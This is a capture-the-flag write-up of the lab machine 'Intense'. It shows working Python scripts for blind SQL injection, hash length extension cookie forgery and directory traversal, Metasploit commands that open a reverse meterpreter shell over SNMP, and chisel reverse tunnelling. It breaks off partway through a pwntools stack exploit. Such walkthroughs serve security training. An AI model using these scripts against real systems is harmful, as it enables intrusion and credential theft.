# Intense

## Intense

Intense was a hard Linux box, and probably my favourite box that I've done. A brief overview is:

* Use [error-based sql injection](intense.md#sql-injection-1) to brute force the admin user's password hash
* Using the admin hash, we [forge a cookie](intense.md#hash-length-extension-1) using a hash length extension vulnerability
* From admin, we can use [directory traversal](intense.md#admin) to read files and directories, taking advantage of custom functions, and get the user flag
* We then [exploit snmp](intense.md#snmp) on the box with the help of admin to get a shell
* [Stack-based binexp](intense.md#root) to get root

### Scanning

Running a service version scan with common scripts:

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-21 13:28 BST
Nmap scan report for 10.10.10.195
Host is up (0.036s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b4:7b:bd:c0:96:9a:c3:d0:77:80:c8:87:c6:2e:a2:2f (RSA)
|   256 44:cb:fe:20:bb:8d:34:f2:61:28:9b:e8:c7:e9:7b:5e (ECDSA)
|_  256 28:23:8c:e2:da:54:ed:cb:82:34:a1:e3:b2:2d:04:ed (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Intense - WebApp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.27 seconds
```

We get 2 ports, `ssh` and `http`, so it's a fairly simple box in regards to ports.

### Basic Web Recon

This is what we see when we first go to the site:

![site](images/site.png)

And there's a few things to note:

* There's a login page where we can login with `guest:guest`
* The page is open source, so we can find the vulnerabilities by reading the source code

Let's first login with guest. We see a few options and some text, not much else:

![guest\_options](images/guest_options.png)

```text
Welcome guest

Please send me feedback ! :)
One day, an old man said "there is no point using automated tools, better to craft his own".
```

Let's have a look at `submit`:

![submit](images/submit.png)

Quite simple, just seems to send a message we type. Let's now look at the source code, and see what we can find.

### Source Code

#### Hash Length Extension

Downloading and unzipping the file gives us an `app` folder, which contains 4 python files:

```text
admin.py
app.py
utils.py
lwt.py
```

\(The folders aren't really useful\)

When browsing over the files, something caught my eye quickly \(in `lwt.py`\):

```python
def sign(msg):
    """ Sign message with secret key """
    return sha256(SECRET + msg).digest()
```

While this may look safe at first, as the `msg` is salted with `SECRET`, which is a random value:

```python
SECRET = os.urandom(randrange(8, 15))
```

This is actually a vulnerability called a hash length extension, which can allow you to forge a signature without knowing the prepended `SECRET`. [This site](https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks) explains it better than I can.

Having a look shows us where this vulnerable function is used:

```python
def verif_signature(data, sig):
    """ Verify if the supplied signature is valid """
    return sign(data) == sig    #<== used here


def parse_session(cookie):
    """ Parse cookie and return dict
        @cookie: "key1=value1;key2=value2"

        return {"key1":"value1","key2":"value2"}
    """
    b64_data, b64_sig = cookie.split('.')
    data = b64decode(b64_data)
    sig = b64decode(b64_sig)
    if not verif_signature(data, sig):
        raise InvalidSignature
    info = {}
    for group in data.split(b';'):
        try:
            if not group:
                continue
            key, val = group.split(b'=')
            info[key.decode()] = val
        except Exception:
            continue
    return info
```

Here we see that it's used to verify a cookie to see if it's valid. Let's have a look at the guest's cookie:

```text
dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7.PB3/sd2ewexkdaMC6imVvpAwc9J0rwIyRFlkpy7W2R0=
```

This is b64 encoded, so when decoding from b64, we get:

```text
username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;[non-printable text]
```

So our cookie is made up of our username, and a `secret` \(not to be mixed up with `SECRET`\). The `secret` seems to be a hash, and after some investigation we find it's the sha256 hash of our password \(`guest` in this case\). The part after that is the signature, which has to pass the check from before.

So before we can forge the admin cookie, we first have to get:

* admin password hash
* admin username \(although we can assume it's `admin`\)

#### SQL Injection

Let's investigate the `submit` function.

Looking around we find the code for it in `app.py`

```python
@app.route('/submit', methods=["GET"])
def submit():
    session = get_session(request)
    if session:
        user = get_user(session["username"], session["secret"])
        return render_template("submit.html", page="submit", user=user)
    return render_template("submit.html", page="submit")


@app.route("/submitmessage", methods=["POST"])
def submitmessage():
    message = request.form.get("message", '')
    if len(message) > 140:
        return "message too long"
    if badword_in_str(message):
        return "forbidden word in message"
    # insert new message in DB
    try:
        query_db("insert into messages values ('%s')" % message)
    except sqlite3.Error as e:
        return str(e)
    return "OK"
```

Here it takes the message you enter, and check it's length and if it has a bad word:

```python
def badword_in_str(data):
    data = data.lower()
    badwords = ["rand", "system", "exec", "date"]
    for badword in badwords:
        if badword in data:
            return True
    return False
```

So we can't use `rand, system, exec, date`. However, we see our potential vulnerability here:

```python
query_db("insert into messages values ('%s')" % message)
```

There doesn't seem to be any sanitation; it just inserts it into the statement.

We'll check for the vulnerability by escaping with a `')`, as it's put in brackets.

When we enter `yes') ;`, it seems to hang and do nothing, which is weird. Let's try:

```text
yes'); SELECT * FROM users--
```

And when we do, we get this error message:

```text
SELECTs to the left and right of UNION do not have the same number of result columns
```

Which confirms that we have an SQL injection vulnerability, however we don't have a visual one, but rather a blind SQL injection vulnerability. We can use error based SQL injection to leak the admin hash.

### Exploiting the site

#### SQL Injection

Our payload will look something like this:

```text
yes') UNION SELECT CASE SUBSTR(secret,{index},1) WHEN '{char}' THEN LOAD_EXTENSION('b') ELSE 'yes' END role FROM users--
```

Here's what each part does:

* `SUBSTR(secret,{index},1)`: What this does is read the items in `secret` column at a certain `index`, which contains the password hash. First parameter is the column to read, second parameter is the index to read at, and third parameter is how many characters to read.
* `WHEN '{char}'`: This checks whether the character is equal to the `char` we provide. This is what we brute force.
* `THEN LOAD_EXTENSION('b')`: If the previous check is correct, it will raise an error to tell us so, as this is an incorrect use of the function `LOAD_EXTENSION()`
* `ELSE 'yes' END`: If the check is incorrect, it won't raise an error and just continue as normal pretty much. `END` terminates the `CASE` statement
* `FROM users--`: Says which database to read from, in our case the `users`

Using this script, we can leak the admin hash:

```python
from requests import Session
from string import printable

session = Session()

guest = "84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec"
admin = ""
chars = "0123456789abcdef"

i = 0

for i in range(0, len(guest)):
    for char in chars:
        message = f"yes') UNION SELECT CASE SUBSTR(secret,{i + 1},1) WHEN '{char}' THEN LOAD_EXTENSION('b') ELSE 'yes' END role FROM users--"

        data = {'message': message}

        r = session.post('http://10.10.10.195/submitmessage', data=data)

        if r.text == "not authorized":    # if an error was thrown
            if char != guest[i]:    # check it wasn't the guest hash that we read
                admin += char
                print(f"char found: {char}")
    if len(admin) != (i + 1):    # checks if we read the same char twice (guest[i] == admin[i])
        char = guest[i]
        admin += char
        print(f"char found: {char}")
    print(f"i: {i}")

print(admin)
```

So we get the hash of `f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105`

#### Hash Length Extension

We now have every part that we need to forge the admin cookie. I will be using the python module `hlextend` \(although `hashpumpy` and others can also be used\).

So how are we going to forge it?

For a hash length extension to work, we need a few parts:

* known data, which is what we have a signature for already; our guest cookie
* appended data, which is what we add on to the known data; this will be the admin cookie \(`username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105`\)
* length of secret, which in our case can be easily brute forced as it's between 9 and 15
* signature for known data, which is the signature for the guest cookie

Putting this all together, we can make a script to iterate through the lengths and test the cookies to see if they work:

```python
#! /usr/bin/python

import hlextend
from base64 import b64decode, b64encode
from binascii import unhexlify, hexlify
from os import system
import urllib
import urllib2

sha = hlextend.sha256()

def fetchcookie():
    url = "http://10.10.10.195/postlogin"
    values = {"username" : "guest", "password" : "guest"}

    data = urllib.urlencode(values)

    req = urllib2.Request(url, data)
    response = urllib2.urlopen(req)
    cookie = response.info().getheader("Set-Cookie")

    sig = cookie.split(".")[1].split(";")[0]
    sig = b64decode(sig)
    sig = hexlify(sig)

    return sig

guestsig = fetchcookie()

append = b";username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;"
prepend = b"username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;"

url = "http://10.10.10.195/admin"

for length in range(8,16):    # iterates through possible lengths 8-15
    extension = sha.extend(append, prepend, int(length), guestsig, raw=True)    # forms cookie
    hash = unhexlify(sha.hexdigest())    # gets fake signature
    cookie = 'auth=%s.%s' % (b64encode(extension) , b64encode(hash))    # puts them together into a usable cookie

    req = urllib2.Request(url)

    req.add_header("Cookie", cookie)

    try:
        response = urllib2.urlopen(req)
        print(cookie)    # if we successfully made the request, the cookie was valid
        exit()
    except:
        pass
```

This script basically brute forces the length, and prints the cookie if it works. Running the script:

```text
$ ./cookie.py
auth=dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxg7dXNlcm5hbWU9YWRtaW47c2VjcmV0PWYxZmMxMjAxMGMwOTQwMTZkZWY3OTFlMTQzNWRkZmRjYWVjY2Y4MjUwZTM2NjMwYzBiYzkzMjg1YzI5NzExMDU7.Uo1e9uzmx1WjBbtdDFbO6PwIy/u3xg2HTdjZu0haeAU=
```

We get our admin cookie! Let's check this works:

![welcome\_admin](images/welcome_admin.png)

Bingo!

### Admin

Now that we're admin, let's see what we can do. We don't seem to have any visible options on the site, so we'll have another look at the source code, in `admin.py`, as that seems most logical.

We find two interesting functions:

```python
@admin.route("/admin/log/view", methods=["POST"])
def view_log():
    if not is_admin(request):
        abort(403)
    logfile = request.form.get("logfile")
    if logfile:
        logcontent = admin_view_log(logfile)
        return logcontent
    return ''


@admin.route("/admin/log/dir", methods=["POST"])
def list_log():
    if not is_admin(request):
        abort(403)
    logdir = request.form.get("logdir")
    if logdir:
        logdir = admin_list_log(logdir)
        return str(logdir)
    return ''
```

Which give us the impression of being able to read files and directories. Let's have a look at `admin_list_log` and `admin_view_log` in `utils.py`:

```python
def admin_view_log(filename):
    if not path.exists(f"logs/{filename}"):
        return f"Can't find {filename}"
    with open(f"logs/{filename}") as out:
        return out.read()

def admin_list_log(logdir):
    if not path.exists(f"logs/{logdir}"):
        return f"Can't find {logdir}"
    return listdir(logdir)
```

And sure enough, we can. Now, what's interesting is it reads from `/logs`, yet it doesn't seem to prevent us from traversing directories, such as with `../`. Let's test it.

First, let's quickly make a script to easily read files and directories:

```python
#! /usr/bin/python

from sys import argv
from os import system

cookie = 'dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxg7dXNlcm5hbWU9YWRtaW47c2VjcmV0PWYxZmMxMjAxMGMwOTQwMTZkZWY3OTFlMTQzNWRkZmRjYWVjY2Y4MjUwZTM2NjMwYzBiYzkzMjg1YzI5NzExMDU7.Uo1e9uzmx1WjBbtdDFbO6PwIy/u3xg2HTdjZu0haeAU='

command = 'curl "http://10.10.10.195/admin/log/view" --cookie "%s" --data "logfile=../../../../../../../../../%s" --output -'  % (cookie, argv[1])

system(command)
```

This just makes a `post` request to the site with `logfile`, which we know from `logfile = request.form.get("logfile")`, and we set this to the file we want to read

\(same concept for listing, just change `logfile` to `logdir`, and `/admin/log/view` to `/admin/log/dir`\)

So now we can run from command line:

```text
$ ./ls.py /
['tmp', 'lost+found', 'root', 'initrd.img', 'usr', 'boot', 'vmlinuz.old', 'home', 'dev', 'lib', 'media', 'srv', 'sbin', 'vmlinuz', 'lib64', 'etc', 'bin', 'run', 'snap', 'sys', 'opt', 'cdrom', 'proc', 'mnt', 'initrd.img.old', 'var']
```

And now we have directory traversal. We can now read `/etc/passwd` to see what users there are, and we find `user`:

```text
user:x:1000:1000:user:/home/user:/bin/bash
```

Let's view their directory:

```text
$ ./ls.py /home/user
['.ssh', '.cache', '.profile', 'note_server', '.gnupg', '.bashrc', '.viminfo', '.bash_history', '.bash_logout', '.sudo_as_admin_successful', 'user.txt', 'note_server.c', '.selected_editor']
```

We find the `user.txt` file, let's see if we can read it:

```text
$ ./cat.py /home/user/user.txt
fa1344b0fed3b05a0abf933020bacc65
```

And we can!

### Snmp

Currently we have read privileges, however we can't actually get a shell from this because the user doesn't have a private `ssh` key. So, we need to find another way in which allows for remote code execution. Luckily for us, there is another running service on the box that we can use to get rce: `snmp`. Snmp is a service that runs on _`UDP`_ port 161 \(which is why we didn't see it before when we did our scan\).

#### Recon

Running a `UDP` port scan we can find the service:

```text
$ sudo nmap -Pn -sC -sV 10.10.10.195 -p 161 -sU
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-12 16:47 GMT
Nmap scan report for 10.10.10.195
Host is up (0.24s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: f20383648c26d05d00000000
|   snmpEngineBoots: 605
|_  snmpEngineTime: 1m12s
| snmp-sysdescr: Linux intense 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64
|_  System uptime: 1m11.80s (7180 timeticks)
Service Info: Host: intense
```

From this we can learn that the version of snmp is `v1`, and also that it's `public`

To interact with `snmp`, you need to use a `community string`, which is basically a password. While snmp doesn't really have accounts which you log in to, a `coummunity string` allows you to use the permissions associated with that `string`, such as reading and writing. Since this is a public server, we can likely use the `public` community string to read data, however if we want to get rce we need a `private` community string that has write permissions as well.

We can use the `public` community string to read some data, using the tool `snmpwalk` \(there are others as well\):

```text
$ snmpwalk -v 1 10.10.10.195 -c public
iso.3.6.1.2.1.1.1.0 = STRING: "Linux intense 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (79446) 0:13:14.46
iso.3.6.1.2.1.1.4.0 = STRING: "Me <user@intense.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "intense"
iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (16) 0:00:00.16
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (16) 0:00:00.16
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (16) 0:00:00.16
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (16) 0:00:00.16
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (16) 0:00:00.16
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (16) 0:00:00.16
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (16) 0:00:00.16
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (16) 0:00:00.16
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (16) 0:00:00.16
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (16) 0:00:00.16
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (16) 0:00:00.16
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (81511) 0:13:35.11
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E4 0B 0C 11 07 15 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/boot/vmlinuz-4.15.0-55-generic root=UUID=03e76848-bab1-4f80-aeb0-ffff441d2ae9 ro debian-installer/custom-installatio"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 173
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
End of MIB
```

However this doesn't really help. To find out the private community string that we need, we can read the config file, and since we have directory traversal we can read this config file. The path is `/etc/snmp/snmpd.conf`, and after reading this file, we find this:

```text
rocommunity public  default    -V systemonly
rwcommunity SuP3RPrivCom90
```

#### Getting RCE

The first is our `public` community string, which we used to read data before \(`ro`, read-only\). The second is a private community string, which has read AND write permissions \(`rw`\). So, now that we've acquired the private community string, we can now get rce. I used the metasploit module `exploit/linux/snmp/net_snmpd_rw_access` for this, but you can also do this [manually](https://medium.com/rangeforce/snmp-arbitrary-command-execution-19a6088c888e). However, I found that the metasploit method is very inconsistent, and only worked once per reset

For the metasploit method, I just used these commands:

```text
use exploit/linux/snmp/net_snmpd_rw_access
set community SuP3RPrivCom90
set rhosts 10.10.10.195
set lhost tun0
set lport 6666
exploit
```

And then you get a `meterpreter` shell. You might have to manually interact with the session after running it:

```text
[*] Sending stage (989416 bytes) to 10.10.10.195
[*] Meterpreter session 1 opened (10.10.14.169:6666 -> 10.10.10.195:40020) at 2020-11-12 17:24:47 +0000
[-] Exploit failed: SNMP::RequestTimeout host 10.10.10.195 not responding
[*] Exploit completed, but no session was created.
msf5 exploit(linux/snmp/net_snmpd_rw_access) > sessions -i 1
[*] Starting interaction with 1...

meterpreter >
```

And now we have a shell!

### Root

#### Setup

**Getting required files**

Using this shell, we can now actually get the `note_server`, and it's libc + interpreter:

```text
download /home/user/note_server            <-- binary
download /home/user/note_server.c        <-- source code
download /lib/x86_64-linux-gnu/libc-2.27.so    <-- libc
download /lib/x86_64-linux-gnu/ld-2.27.so    <-- interpreter
```

**Port forwarding**

Since the binary we have to exploit listens on a server \(port 5001\), it'll be best for us to port forward so that we can access the service from our local machine. To do this I'm going to use `chisel`, because metasploit port forwarding wasn't working for me. Using our meterpreter we can upload `chisel`, and then run it.

On your local machine, run:

```text
./chisel server -p 8080 --reverse
```

\(It can be any port you choose\)

Then on the remote machine, run:

```text
./chisel client [your ip]:8080 R:[lport]:127.0.0.1:5001
```

And now you should be able to connect to the service on `localhost:[lport]`

**Setting up the environment**

This part isn't necessary, but I would recommend doing this as it makes transferring to remote much easier, as remote and local would basically be the same.

Using `patchelf`, we'll first change the interpreter of the binary to the one we downloaded just then:

```text
patchelf ./note_server --set-interpreter ./ld-2.27.so
```

Then we change the libc used by the binary:

```text
patchelf ./note_server --add-needed ./libc-2.27.so
```

Now that we have the environment set up, we can now attack the binary

#### Basic Recon

**Protections**

```text
$ pwn checksec ./note_server
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

$ ./cat.py /proc/sys/kernel/randomize_va_space
2
```

Running a checksec tells us that we are dealing with full protections \(except from fortify\), and reading `/proc/sys/kernel/randomize_va_space` tells us we have full ASLR. Here's an overview of what we're dealing with

* Full RELRO - The entire GOT section is read-only, meaning we can't overwrite an entry and redirect code execution when that function is called
* Canary - A randomised 8 byte value \(7 random bytes and a null\) is placed before the base pointer and return pointer, to detect if stack smashing has occurred. We'll need to leak the canary to overwrite the return pointer successfully
* NX - No region of memory is both writeable and executable, so no shellcode
* PIE - The binary base \(where the binary is loaded\) is randomised
* ASLR - Randomises libc and stack addresses

**Source Code**

Since we are given the source code, we won't need to disassemble and decompile the program, which makes our life easier. This is the source code:

```c
// gcc -Wall -pie -fPIE -fstack-protector-all -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro note_server.c -o note_server

#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define BUFFER_SIZE 1024

void handle_client(int sock) {
    char note[BUFFER_SIZE];
    uint16_t index = 0;
    uint8_t cmd;
    // copy var
    uint8_t buf_size;
    uint16_t offset;
    uint8_t copy_size;

    while (1) {

        // get command ID
        if (read(sock, &cmd, 1) != 1) {
            exit(1);
        }

        switch(cmd) {
            // write note
            case 1:
                if (read(sock, &buf_size, 1) != 1) {
                    exit(1);
                }

                // prevent user to write over the buffer
                if (index + buf_size > BUFFER_SIZE) {
                    exit(1);
                }

                // write note
                if (read(sock, &note[index], buf_size) != buf_size) {
                    exit(1);
                }

                index += buf_size;


            break;

            // copy part of note to the end of the note
            case 2:
                // get offset from user want to copy
                if (read(sock, &offset, 2) != 2) {
                    exit(1);
                }

                // sanity check: offset must be > 0 and < index
                if (offset < 0 || offset > index) {
                    exit(1);
                }

                // get the size of the buffer we want to copy
                if (read(sock, &copy_size, 1) != 1) {
                    exit(1);
                }

                // prevent user to write over the buffer's note
                if (index > BUFFER_SIZE) {
                    exit(1);
                }

                // copy part of the buffer to the end 
                memcpy(&note[index], &note[offset], copy_size);

                index += copy_size;
            break;

            // show note
            case 3:
                write(sock, note, index);
            return;

        }
    }


}



int main( int argc, char *argv[] ) {
    int sockfd, newsockfd, portno;
    unsigned int clilen;
    struct sockaddr_in serv_addr, cli_addr;
    int pid;

    /* ignore SIGCHLD, prevent zombies */
    struct sigaction sigchld_action = {
        .sa_handler = SIG_DFL,
        .sa_flags = SA_NOCLDWAIT
    };
    sigaction(SIGCHLD, &sigchld_action, NULL);

    /* First call to socket() function */
    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    if (sockfd < 0) {
        perror("ERROR opening socket");
        exit(1);
    }
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
        perror("setsockopt(SO_REUSEADDR) failed");

    /* Initialize socket structure */ 
    bzero((char *) &serv_addr, sizeof(serv_addr));
    portno = 5001;

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    serv_addr.sin_port = htons(portno);

    /* Now bind the host address using bind() call.*/
    if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
        perror("ERROR on binding");
        exit(1);
    }

    listen(sockfd,5);
    clilen = sizeof(cli_addr);

    while (1) {
        newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);

        if (newsockfd < 0) {
            perror("ERROR on accept");
            exit(1);
        }

        /* Create child process */
        pid = fork();

        if (pid < 0) {
            perror("ERROR on fork");
            exit(1);
        }

        if (pid == 0) {
            /* This is the client process */
            close(sockfd);
            handle_client(newsockfd);
            exit(0);
        }
        else {
            close(newsockfd);
        }

    } /* end of while */
}
```

**Understanding the program**

The `main` function isn't really important to us, it just creates a server to listen on port 5001, forks when it receives a connection and calls the `handle_client` function. The important take away from this however, is the fact that it uses `fork()` to make a new process. `fork()` will copy everything from the parent process, meaning that all the addresses and canaries will be the same every time we connect, which will be important later.

The `handle_client` function is what we're met with when we connect, and it has 3 options, which I'll go over quickly, and other variables:

Variables:

* cmd - The option number
* note - This is our buffer where we write our input to, and has a size of `1024`, or `0x400`
* index - This basically acts as the pointer to the end of the input that we've entered, and is used when the program want to write more data to the buffer

Choices:

* write \(1\) - This will take input from us, firstly asking for the size of the data, then the data itself. It then increments the index so that it points to the end of that buffer. When we write again, it is incremented so it points to the end of the new buffer, or total buffer

Say that when we connect, we add 8 bytes to our buffer:

```text
aaaaaaaa
        ^
     index: 8
```

The index will point to the end, then when we add another 8 bytes, it will read 8 bytes at where index points to:

```text
aaaaaaaabbbbbbbb
        ^
     index: 8
```

Then increments the index to point to the end of the new buffer:

```text
aaaaaaaabbbbbbbb
                ^
             index: 16
```

Before the data is written, it's also checked to see if it would still be inside the designated buffer \(buf\_size + index &lt; 1024\)

* copy \(2\) - This will copy a part of your existing buffer to the end of the buffer, and increments the index accordingly. Two unique variables are used for this, `copy_size` and `offset`. `copy_size` is just how much data will be copied, and `offset` is the index of the source for the copy

Let's take the previous example of:

```text
aaaaaaaabbbbbbbb
                ^
             index: 16
```

And for the copy we supply: `copy_size`: 8 `offset`: 4

It now looks like this:

```text
aaaa|aaaabbbb|bbbb
    |        |    ^
offset: 4    | index: 16
             |
       offset + copy_size: 12
```

It will now check that the offset is within the allowed range \(offset =&gt; 0 \| offset &lt;= index \| index &lt;= 1024\) before doing the copy. If it passes this check, it copies this section to the end:

```text
aaaaaaaabbbbbbbbaaaabbbb
                ^
             index: 16
```

And then it increments index:

```text
aaaaaaaabbbbbbbbaaaabbbb
                        ^
                    index: 24
```

* dump \(3\) - This will print the buffer up to the index. Then it makes the function _return_, and terminate the process. If we dumped the previous buffer, we'd just get:

  ```text
  aaaaaaaabbbbbbbbaaaabbbb
  ```

  And it's not null/newline terminated

### Finding the bug

#### Write

This option is pretty safe because it doesn't allow us to write outside our buffer.

```c
// prevent user to write over the buffer
if (index + buf_size > BUFFER_SIZE) {
    exit(1);
}
```

This essentially checks that our new data won't go over the buffer size, and if it doesn't go over it will allow us to write our new data.

So no matter what we can't write outside our buffer with `write`.

#### Dump

This option will allow for us to leak values from the stack. The issue currently with that if it only reads inside our buffer up to the index, so if we could find a way to increase the index without overwriting the values on the stack we could get a leak. Since `write` only allows for us to write the exact amount of data we specify, no less, we can't just increase the index by 0x30 by giving that as a size, and only giving 8 bytes of data, for example.

Another thing to mention is that since `write` forces the function to return, we can only get one leak per connection, then it ends. However, since the program uses `fork` the values are constant, so we could use two different connections:

* 1st: Leak values from the stack
* 2nd: Get shell

#### Copy

`copy` is interesting, and is the main vulnerability here. It will allow us to do both of the things I mentioned before:

* write outside our buffer
* increase index without overwriting values

**Leaking with copy**

I'll first talk about the latter. Basically to get a leak here, we need to have a situation that looks something like this:

```text
|AAAAAAAABBBBBBBB|0xdf8a3900553d3c00|
|                |                  |
|   our input    |   desired value  |
                                  index
```

Where we can just then dump up to the index, leaking the value.

We can set this up using `copy`, since it allows for us to copy stuff _outside_ of our buffer to the end of our buffer, since there's no check to prevent us from doing that.

For example, we first specify the `offset` and `copy_size`:

```text
AAAAAAAA|BBBBBBBB 0xdf8a3900553d3c00|
        |        ^                  |
     offset    index            offset+size
```

Then it copies to the end of the buffer \(at index\):

```text
AAAAAAAABBBBBBBB BBBBBBBB 0xdf8a3900553d3c00
                ^                  
              index
```

And increments the index:

```text
AAAAAAAABBBBBBBBBBBBBBBB 0xdf8a3900553d3c00
                ^                          ^                  
           copied data                   index
```

So we could then leak that value with `dump`.

Also:

```c
// sanity check: offset must be > 0 and < index
if (offset < 0 || offset > index) {
    exit(1);
}
```

Since it only prevents the offset being bigger, not being equal to, we can just set the offset to the index. This would essentially just write the same data to the same spot, so nothing changes on the stack, but our index would increase, so we could then read it:

```text
AAAAAAAABBBBBBBB|0xdf8a3900553d3c00|
                |                  |
              offset           offset+size
              index
```

```text
AAAAAAAABBBBBBBB 0xdf8a3900553d3c00
                                   ^
                                 index
```

**Overflowing with copy**

Once we have the required values, we now need to be able to control execution. Fortunately, with `copy` we can also smash the stack to overwrite the return pointer, and hopefully get a shell. Unlike the `write` function which has checks in place to prevent buffer overflows, `copy` doesn't have these checks. The only check it makes is:

```c
// prevent user to write over the buffer's note
if (index > BUFFER_SIZE) {
    exit(1);
}
```

Which only checks if the index is within the buffer size, and doesn't check what the new size of `index + copy_size` would be, which `write` does.

### Exploiting the binary

Let's now start creating the script. I started off by writing some wrapper functions for each option:

```python
from pwn import *
from sys import argv

e = context.binary = ELF("./note_server_patched")
libc = e.libc

port = argv[1]
p = remote("127.0.0.1", port)


def recv():
    return p.clean()

def send(text):
    p.send(text)
    recv()


def write(text):
    send('\x01')
    length = len(text)
    send(chr(length))
    send(text)

    global index
    index += length

def copy(length, offset=0):
    send('\x02')

    start = p16(offset)
    send(start)

    send(chr(length))

    global index
    index += length

def dump():
    p.send('\x03')
